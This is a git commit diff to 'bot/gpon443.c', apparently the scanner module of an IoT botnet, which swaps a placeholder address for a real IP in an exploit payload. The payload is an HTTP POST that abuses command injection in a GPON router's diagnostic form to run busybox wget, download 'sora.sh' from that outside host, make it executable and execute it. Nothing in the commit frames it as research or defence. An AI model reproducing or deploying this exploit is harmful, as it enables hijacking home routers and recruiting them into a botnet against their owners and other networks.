29d8823a013b1e5f1d6e6cbef53b4750eaadf605
apaple <76417012+apaple@users.noreply.github.com>
2023-08-27 22:56:50 +0700

    Update gpon443.c

--- bot/gpon443.c
+++ bot/gpon443.c
@@ -286,7 +286,7 @@ void gpon443_scanner(void)
                         #endif
 
                         // build stage 2 payload
-                        util_strcpy(conn->payload_buf, "POST /GponForm/diag_Form?style/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://0.0.0.0/sora.sh+-O+vaicalon;chmod+777+*;sh+vaicalon`&ipv=0");
+                        util_strcpy(conn->payload_buf, "POST /GponForm/diag_Form?style/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://103.56.4.193/sora.sh+-O+vaicalon;chmod+777+*;sh+vaicalon`&ipv=0");
 
                         // actually send the payload
                         send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
